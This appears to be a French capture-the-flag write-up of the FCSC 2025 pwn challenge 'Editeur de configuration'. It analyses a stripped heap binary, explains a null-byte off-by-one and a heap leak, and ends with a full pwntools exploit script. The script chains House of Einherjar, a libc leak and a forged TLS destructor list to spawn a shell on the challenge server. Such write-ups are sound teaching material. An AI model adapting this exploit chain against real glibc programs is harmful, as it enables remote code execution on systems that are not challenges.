---
title: "[FCSC 2025] - Editeur de configuration"
subtitle: ""
date: 2025-05-01
draft: false
author: "LelBy"
description: "Write-Up du challenge de pwn \"Editeur de configuration \" du FCSC 2025"
images: ["images/fcsc_preview.png"]

tags: ["FCSC", "Write-up", "Heap"]
categories: ["Pwn"]

featuredImage: "images/fcsc_preview.png"
featuredImagePreview: ""
---

## Description

> "Ce logiciel d'édition de configuration a quelques soucis... Saurez-vous en faire bon usage ?"

**Catégorie :** Pwn

**Difficulté :** ⭐⭐⭐

**Protections :** Full RelRO, NX, Canary, PIE, Stripped, No Src

## TL;DR

- Exploitation d'un off-by-one null byte dans le tas (Heap) via un appel à `realloc()` mal sécurisé dans la fonction de modification d'une entrée
- Leak d'une adresse de la heap en raison de l'absence de l'ajout d'un null byte à la fin d'une chaine de caractère
- ``Heap Feng Shui`` suivi de l'utilisation de la technique `House of Einherjar` pour obtenir une primitive de chevauchement de chunks, permettant une lecture/écriture arbitraire
- Leak de la ``libc`` en lisant un pointeur de ``l'arena`` via un chunk dans ``l'Unsorted Bin``
- Exécution d'un shell en injectant une fausse `dtor_list` dans la ``TLS`` et terminaison propre du programme, appelant `__call__tls_dtors`.

## Analyse du binaire

Ce binaire est un éditeur de configuration avec un menu assez classique. En effet, il nous demande d'importer une configuration, avec un header valide :

![](images/Pasted%20image%2020250503173421.png)

Après avoir importé la configuration initial, il est possible de réaliser différente actions tel que l'ajout d'une entrée , la suppression d'une entrée ou la modification d'une entrée déja présente.

![](images/Pasted%20image%2020250503173616.png)

Le binaire étant strippé, nous allons devoir utiliser IDA pour retrouver les structures originales et analyser le code.

### Structures et fonctionnement

On remarque dans un premier temps que les données utilisateurs sont lues grâce à la fonction `getline()`, cela aura son importance pour la suite. 

Pour ajouter la toute première entrée, il faut préciser un header valide qui représentera le nom de la configuration :
```c
int __fastcall config_check_header(struct config_t *pconfig)
{
  __ssize_t sz; // [rsp+10h] [rbp-10h]
  char *line; // [rsp+18h] [rbp-8h]

  sz = getline(&g_line, &g_line_size, stdin);
  if ( sz == -1 )
    return -1;
  line = g_line;
  if ( *g_line == '[' )
  {
    if ( g_line[sz - 2] == ']' )
    {
      g_line[sz - 2] = 0;
      strncpy(&pconfig->username, line + 1, 16uLL);
      return strcmp(&pconfig->username, "PLAYER"); // <---- Valid header
    }
    else
    {
      puts("bad format header");
      return -1;
    }
  }
  else
  {
    puts("header not found");
    return -1;
  }
}
```

La toute première structure créée lors de l'importation est `config_t` qui représente la configuration. Elle garde en mémoire le header de la configuration et le pointeur sur la dernière entrée ajoutée. Cette structure est allouée en stack une seul fois.

```c
struct config_t

{
	char username[16];
	__int64 unk;
	struct entry_t *last_pentry;
};
```

Ensuite, le programme parse ligne par ligne les données récupérées dans l'entrée standard pour y ajouter des champs de la forme `KEY=VALUE`. Ainsi, cette fonction alloue dynamiquement la mémoire pour créer la structure représentant une entrée de la configuration, pour chaque lignes.

```c

struct entry_t *__fastcall config_entry_alloc(__int64 token_size, __int64 value_size)
{
  struct entry_t *config; // [rsp+18h] [rbp-8h]

  config = (struct entry_t *)malloc(40uLL);
  if ( !config )
    return 0LL;
  config->value = 0LL;
  config->key = 0LL;
  config->size = 0LL;
  config->pPrev = 0LL;
  config->pNext = 0LL;
  config->key = (char *)malloc(token_size + 1);
  if ( !config->key )
    return 0LL;
  config->value = (char *)malloc(value_size + 1);
  if ( !config->value )
    return 0LL;
  config->key[token_size] = 0;
  config->value[value_size] = 0;
  config->size = value_size;
  return config;
}

```

La structure qui nous intéresse le plus est `entry_t`. Cette structure est allouée dans la heap, et c'est une liste doublement chainée. Chaque `entry_t` contient un pointeur vers une clé, parmi  `name, level, team, elo, token`, un pointeur vers la valeur, ainsi que le maillon suivant et précédent de la liste doublement  chainée. Comme vu précédemment, `key` et `value` sont alloués dans la heap.

```c
struct entry_t
{
	char *value;
	char *key;
	__int64 size;
	struct entry_t *pPrev;
	struct entry_t *pNext;
};

```

Chaque entrées est donc ajouté à la suite, avec les pointeurs `pPrev` et `pNext` ajusté.  La liste étant parcourue à partir de la fin, il est possible d'ajouter plusieurs entrées avec le même nom de clé. Ainsi la dernière entrée ajoutée, sera la première retournée lors du parcours de la chaine.  

## Recherche de vulnérabilités

### Off-By-One null byte

Dans la fonction d'édition d'une entrée, il est possible de provoquer un débordement de 1 octet nulle. 

```c
__int64 __fastcall config_edit_entry(struct config_t *pconfig)
{
  unsigned int v2; // [rsp+14h] [rbp-1Ch]
  struct entry_t *new_config; // [rsp+18h] [rbp-18h]
  struct entry_t *current; // [rsp+20h] [rbp-10h]
  size_t new_size; // [rsp+28h] [rbp-8h]

  v2 = 1;
  new_config = 0LL;
  new_size = getline(&g_line, &g_line_size, stdin);
  if ( new_size != -1LL )
  {
    new_config = config_parse(g_line, new_size);
    if ( new_config )
    {
      for ( current = pconfig->last_pentry; current && strcmp(current->key, new_config->key); current = current->pPrev )
        ;
      if ( current )
      {
        if ( new_config->size > (unsigned __int64)current->size )
        {
          current->value = (char *)realloc(current->value, new_config->size);// VULNERABILITY : realloc() size is too small !
          current->size = new_config->size + 1;
        }
        memset(current->value, 0, new_config->size + 1);// Null Off-by-one
        memcpy(current->value, new_config->value, new_config->size);
        v2 = 0;
      }
      else
      {
        puts("key not found");
      }
    }
  }
  if ( new_config )
  {
    free(new_config->value);
    new_config->value = 0LL;
    free(new_config->key);
    new_config->key = 0LL;
    free(new_config);
  }
  return v2;
}

```

Le fonctionnement de la fonction `realloc()` est le suivant :
- Lorsque la taille demandée est inférieure ou égale à la taille du chunk courant, on retourne le pointeur
- Si la taille demandée est strictement supérieure, alors on libère la mémoire et on alloue un chunk plus grand, puis on copie les données

Lors de l'ajout d'une entrée, le champs `size` représente la taille de `value`. Si on alloue une chaine de caractère de taille, disons `0x37`, l'appel à `malloc(value_size + 1)` retournera un chunk capable de contenir au plus `0x38` bytes, ce qui est suffisant pour contenir la chaine ainsi que l'octet nulle.

Cependant, dans la fonction de modification, si on ajoute une chaine de caractère de `0x38`, `realloc` va retourner le même chunk car la taille est suffisante pour stocker la chaine. Le développeur n'a pas pris en compte l'octet null dans la taille à passer à `realloc`. L'appel à `memset`, quand à lui, se fait sur `size + 1`, entrainant un débordement de un octet null sur le chunk suivant dans le tas.  

### Leak d'une adresse du tas

Une autre vulnérabilité est présente dans la fonction de parsing de l'entrée utilisateur. 

```c

struct entry_t* __fastcall config_parse(const char* line_ptr, size_t line_sze){

sep = strchr(line_ptr, '=');
  if ( sep )
  {
    key_size = sep - line_ptr;
    value_ptr = sep + 1;
    value_size = line_size - (sep - line_ptr) - 2;
    if ( (unsigned int)config_check_key(line_ptr, sep - line_ptr) )
    {
      pentry = config_entry_alloc(key_size, value_size);
      if ( pentry )
      {
        idx = strcspn(line_ptr, " ");
        if ( idx >= key_size )                  // not taken if idx < key_size
          memcpy(pentry->key, line_ptr, key_size);
        else
          memcpy(pentry->key, line_ptr, idx);
        na = strcspn(value_ptr, " ");
        if ( na >= value_size )                 // not taken if idx < value_size
        {
          memcpy(pentry->value, value_ptr, value_size);
        }
        else
        {
          pentry->size = na;
          memcpy(pentry->value, value_ptr, na); // No null byte added at the end
        }
        return pentry;
      }
      else
      {
        return 0LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  else
  {
	puts("incorrect line format");
	return 0LL;
  }
}
```

Lors de l'appel à `config_entry_alloc`, un octet null est ajoutée par defaut à la fin du bloc, avant la copie en mémoire de la chaine. Par ailleurs, le bloc n'est pas remis à zero lors de l 'allocation. Il est alors possible de récupérer une adresse du tas lors de l'affichage des `entry_t` du menu. 

```c
// ...
  config->value = (char *)malloc(value_size + 1);
  if ( !config->value )
    return 0LL;
  config->key[token_size] = 0;
// ...
```

On observe l’utilisation de la fonction `strcspn`, qui retourne l’index du premier caractère de la chaîne source appartenant à un ensemble donné, ici, le caractère espace `' '`. Cela permet d’isoler la première partie de la chaîne, pour ne copier que la partie après l'espace.  Si cette sous chaîne est plus courte que prévu, elle est copiée **sans ajout d'octet null**. Il faut donc s’arranger pour que le nombre de caractères copiés tombe juste avant une adresse à récupérer et le tour est joué !

Nous allons exploiter le fait qu’un chunk de type `entry_t`, une fois libéré, conserve un pointeur vers un emplacement dans le tas. L’objectif est donc de réallouer à cet emplacement un chunk de type `value`, de manière à récupérer ce pointeur. Nous appellerons `E`, un chunk contenant une structure `entry_t`, `V` un chunk, `value` et `K`, un chunk `key`.

![](images/Pasted%20image%2020250504163839.png)

Comme le montre ce schéma, nous allons orchestrer les allocations de manière à ce qu’un chunk `value` de taille `0x40` soit placé à l’emplacement d’une structure `entry_t` précédemment libérée. À chaque ajout dans la configuration, trois allocations sont effectuées, ce qui permet de contrôler l’ordre d’allocation dans le tas. L’adresse ainsi récupérée correspond au champ `entry_t->pPrev`.
Il est important de noter que la protection **Safe Linking** est activée pour les `tcache`, ce qui complique l’obtention d’un pointeur de heap valide, car les pointeurs dans les listes sont masqués par un XOR avec une valeur dérivée de l’adresse du chunk courant.

## Exploitation

### House of Einherjar

Dans un premier temps, on remarque que la version de la `libc` fournie est la **2.35**.  
En consultant les différentes techniques d’exploitation référencées sur [How2Heap](https://github.com/shellphish/how2heap), on identifie une méthode particulièrement adaptée à notre cas : la **House of Einherjar**.

Cette technique tire parti d’un débordement d’un octet nul pour effacer le flag `PREV_INUSE` du chunk suivant, amenant l’allocateur à considérer à tort que le chunk précédent est libre. Lors d’un appel à `free`, si le chunk libéré ne rentre ni dans les `tcache` ni dans les `fastbins`, la `libc` tente de le consolider avec son chunk précédent, ouvrant la voie un chevauchement de chunks.

Pour mettre en œuvre cette technique, plusieurs conditions doivent être réunies :

- Le contrôle du champ `prev_size` du chunk cible qui doit être égale à la distance entre le fake chunk et le chunk victime
- Un leak d’adresse dans la heap
- La création d’un faux chunk satisfaisant les vérifications tel que **Unsafe Unlink** dans le mécanisme des `Unsorted Bin`, s'assurant que la liste doublement chainée n'est pas corrompue.

![](images/Pasted%20image%2020250504163904.png)

L'objectif est donc d'obtenir un **chevauchement de chunk** dans une zone **contrôlé par l'utilisateur** pour pouvoir altérée son contenu. Il va donc falloir jouer avec les allocations pour obtenir une configuration avantageuse pour réaliser cette attaque.

### Heap Feng Shui

Avant de lancer l'attaque, il est nécessaire de mettre la heap dans un état bien précis, en respectant plusieurs contraintes que nous impose le challenge :

- Le chunk victime doit avoir une taille d’au moins `0x100`. En effet, le champ `mchunk_size` encode à la fois la taille du chunk et le flag `PREV_INUSE`. Ainsi, si l’on écrase le LSB avec un octet nul, cela ne doit pas affecter la taille effective du chunk.
- Ce chunk ne doit pas appartenir aux `fastbins`, car ceux-ci ne sont pas consolidés lors des appels à `free`.
- Le `tcache[0x100]` doit être saturé avant de libérer le chunk victime, afin que celui-ci soit placé dans l’`unsorted bin`.
- Il faut parvenir à placer deux chunks `value` consécutifs en mémoire, ce qui est crucial pour manipuler les métadonnées du chunk suivant.
- Enfin, le buffer alloué par `getline` ne doit pas excéder `0x400`, afin de rester dans les plages de taille gérées par les `tcaches`.
- Pour écrire dans le champ `PREV_SIZE`, on peut réutiliser plusieurs fois la fonction de modification d'une entrée — qui utilise `realloc()` suivi d’un `memset(0)` — afin d'écrire des octets null (`\x00`) un par un.

Le schéma suivant montre les différentes étapes de l'attaque permettant d'obtenir une structure `entry_t` dans le buffer de `getline`, nous permettant d'obtenir une primitive d'écriture et de lecture arbitraire.

![](images/Pasted%20image%2020250504190525.png)

Il est nécessaire à la fin de l'attaque, de vider le `tcache[0x30]` pour permettre à `malloc` d'allouer un chunk à partir de `l'Unsorted bin`.

### Leak d'une adresse de ``libc``

Pour récupérer une adresse de `libc`, nous pouvons utiliser notre primitive de lecture arbitraire pour aller lire le pointeur `FD` du chunk contenue dans `l'unsorted bin`. On va donc réécrire le pointeur `value` de la structure `entry_t` que nous contrôlons. Une fois que le menu affichera les paires de `key` et `value`, nous pourrons récupérer l'adresse vers `main_arena`, permettant de calculer la base de la `libc`.

![](images/Pasted%20image%2020250504234904.png)


### Exécution via `__call_tls_dtors`

Lors de la terminaison normale du programme, ou à la suite d’un appel à `exit()`, la fonction `__call_tls_dtors` est invoquée afin d’exécuter les destructeurs TLS (Thread-Local Storage). En falsifiant la structure pointé par `tls_dtor_list`, il est possible de détourner ce mécanisme pour exécuter un appel arbitraire lors de la fin du programme. 

Nous allons donc forger une fausse structure de type `struct dtor_list`, puis faire en sorte que le pointeur global `tls_dtor_list` la référence.

```c
struct dtor_list {
	dtor_func func;              // Function pointer to call
	void* obj;                   // Argument
	struct link_map *map;        // None
	struct dtor_list *next;      // None
}
```

Le pointeur de fonction étant obfusqué par un `PTR_MANGLE cookie` présent dans la TLS, nous devons en premier lieux le récupérer avec notre primitive de lecture.

![](images/Pasted%20image%2020250505000200.png)

Le pointeur de fonction est manglé en utilisant cette formule : 
```c
dtor_list->func = rol((system ^ PTR_MANGLE_COOKIE), 0x11, 64)
```

En réutilisant notre primitive, comme pour la lecture arbitraire, nous allons écrire notre fausse structure 8 octets par 8 octets en mémoire.

```python
# Writing to tls_dtors_list
aarb_write(tls_dtors_list_addr, p64(tls_dtors_list_addr + 64), 8)
# Writing mangled system() to dtor_list->func
aarb_write(tls_dtors_list_addr + 64, p64(rol((system ^ tls_cookie), 0x11, 64)), 8)
# Writing address of /bin/sh to dtor_list->obj
aarb_write(tls_dtors_list_addr + 72, p64(binsh), 8)
```

Avant d'obtenir un shell, il ne reste plus qu'à écrire une dernière fois notre structure `entry_t` pour mettre à 0 `pNext` et `pPrev` et quitter le programme proprement pour exécuter notre shell !

## Flag

![](images/Pasted%20image%2020250505001016.png)

## Code

```python

#!/usr/bin/python3

from pwn import *

# https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_einherjar.c

exe = ELF("editeur-de-configuration")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe

gdb_script = r'''

    init-pwndbg
    dprintf malloc,"malloc(%p)\n",$rdi
    c

'''

def io():

    if args.SSH:
        s = ssh(user="",
                password="",
                host="",
                port=22
        )
        p = s.process([exe.path])
    
    elif args.REMOTE:
        p = remote("chall.fcsc.fr", 2103)

    else:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)

    return p

def edit_add_entry(key, value):

    p.sendlineafter(b"> ", b"1")
    p.sendline(key + b"=" + value)

def edit_del_entry(key):

    p.sendlineafter(b">", b"2")
    p.sendline(key)

def edit_mod_entry(key, value):
    
    p.sendlineafter(b"> ", b"3")
    p.sendline(key + b"=" + value)

def aarb_read(where):

    if not primitives:
        return None

    payload = b"R"*0x11b
    payload += p64(0x0)
    payload += p64(0x31)
    payload += p64(where)
    payload += p64(where)
    payload += p64(0x0)
    payload += p64(0x0)

    edit_add_entry(b"team", payload)
    edit_del_entry(b"team")

    data = p.recvuntil(b">")
    p.sendline(b"\n")

    return data

def aarb_write(where, what, size):

    if not primitives:
        return None
    
    payload = b"W"*0x11b
    payload += p64(0x0)
    payload += p64(0x31)
    payload += p64(where)
    payload += p64(heap_leak + 0x370)
    payload += p64(size)
    payload += p64(0x0)
    
    edit_add_entry(b"team", payload)
    edit_del_entry(b"team")
    
    edit_mod_entry(b"token", what)

if __name__ == "__main__":

    PREV_SIZE = 0x5b0
    FAKE_OFFSET = 0x380
    LIBC_ARENA_OFFSET = 0x340

    p = io()
    primitives = False

    # Import config menu and trigger getline() big allocation to avoid realloc()
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", b"[PLAYER\x00" + b"A"*0x3e8 + b"]")
    
    # Allocate the first entry_t, entry_t->key and entry_t->value    
    p.sendline(b"name=" + b"A"*0x40 + b"\n")

    # Edit config menu
    p.sendlineafter(b"> ", b"2")

    # Allocate two more chunk
    edit_add_entry(b"name", b"B"*0x40)
    edit_add_entry(b"name", b"C"*0x40)

    # Free entry_t, entry_t->key and entry_t->value 2 times
    edit_del_entry(b"name")
    edit_del_entry(b"name")

    # This will use the no null byte vuln added when adding a space in value
    # This chunk will replace the old entry_t
    edit_add_entry(b"name", b"D"*0x18 + b" " + b"D"*0x8)

    # Heap leak
    heap_leak = p.recvuntil(b"AAAA\n").partition(b"name = DDDDDDDDDDDDDDDDDDDDDDDD")[2]
    heap_leak = heap_leak.partition(b"\nname")[0]
    heap_leak = int.from_bytes(heap_leak, "little")
    
    log.info("Heap leak : " + hex(heap_leak))

    # Allocate one entry_t that we will free later for grooming
    edit_add_entry(b"elo", b"E"*0x30)
    
    # Allocate the entry_t that will off-by-one his neighbour
    edit_add_entry(b"level", b"F"* (0x38-1))

    # Make the victime chunk that will be off-by-one next to the overflowing one
    edit_del_entry(b"elo")
    edit_add_entry(b"token", b"G"*0xf0)
    
    # TRIGGER null off-by-one
    edit_mod_entry(b"level", b"H" * 0x38)

    # Clearing PREV_SIZE
    for i in range(1, 9):
        edit_mod_entry(b"level", b"H"* (0x38-i))

    # Writing PREV_SIZE
    edit_mod_entry(b"level", b"H"*0x30 + p64(PREV_SIZE).replace(b"\x00", b""))

    # Filling the tcache (0x100)
    for i in range(0, 7):
        edit_add_entry(b"elo", b"I"*0xf0)

    for i in range(0, 7):
        edit_del_entry(b"elo")

    # Prefill some fastbins for later 0x20 allocation
    for i in range(0, 7):
        edit_add_entry(b"elo", b"!"*0x8)
    
    for i in range(0, 7):
        edit_del_entry(b"elo")

    fake_chunk = p64(0x0)
    fake_chunk += p64(PREV_SIZE)
    fake_chunk += p64(heap_leak - FAKE_OFFSET)
    fake_chunk += p64(heap_leak - FAKE_OFFSET)
    fake_chunk += p64(0x0)
    fake_chunk += p64(0x0)

    # Writing fake chunk in getline() buffer
    edit_add_entry(b"team", b"J"*0x11b + fake_chunk)
    
    # TRIGGER VULN
    # Free the overflowed chunk and trigger consolidation
    edit_del_entry(b"token")
    
    # Empty the 0x20 and 0x30 tcache
    for i in range(0, 7):
        edit_add_entry(b"elo", b"K"*0xf0)

    # Alloc an entry_t (0x20) inside the getline() chunk
    edit_add_entry(b"token", b"L"*0x8)

    # Place the 0x160 chunk in tcache to permit the overflow of the chunk in getline
    edit_del_entry(b"team")

    primitives = True
    
    libc_leak = aarb_read(heap_leak - LIBC_ARENA_OFFSET)
    
    libc_leak = int.from_bytes(libc_leak.partition(b"[PLAYER]\n")[2][:6], "little")
    libc.address = libc_leak - 0x21ace0

    log.info("Libc Arena leak : " + hex(libc_leak))
    log.info("Libc base : " + hex(libc.address))

    tls_base = libc.address - 0x28c0
    tls_dtors_list_addr = tls_base - 0x58

    tls_cookie = aarb_read(tls_base + 0x30)
    tls_cookie = int.from_bytes(tls_cookie.partition(b"[PLAYER]\n")[2][:8], "little")
    
    log.info("Leaking TLS cookie : " + hex(tls_cookie))
    log.info("@tls_dtors_list : " + hex(tls_dtors_list_addr))

    system = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    log.info("@system : " + hex(system))
    log.info("@/bin/sh : " + hex(binsh))
    
    # Writing to tls_dtors_list
    log.info("Writing to : " + hex(tls_dtors_list_addr))
    aarb_write(tls_dtors_list_addr, p64(tls_dtors_list_addr + 64), 8)
    
    log.info("Writing to : " + hex(tls_dtors_list_addr + 64))
    aarb_write(tls_dtors_list_addr + 64, p64(rol((system ^ tls_cookie), 0x11, 64)), 8)

    log.info("Writing to : " + hex(tls_dtors_list_addr + 72))
    aarb_write(tls_dtors_list_addr + 72, p64(binsh), 8)

    log.info("Bypass clean_proc and unlink of entry_t")

    # Nullify entry_t->pNext and entry_t->pPrev
    payload = b"W"*0x11b
    payload += p64(0x0)
    payload += p64(0x31)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(0x0)

    edit_add_entry(b"team", payload)
    edit_del_entry(b"team")
    
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", b"3")

    log.info("Profit :)")

    p.interactive()



```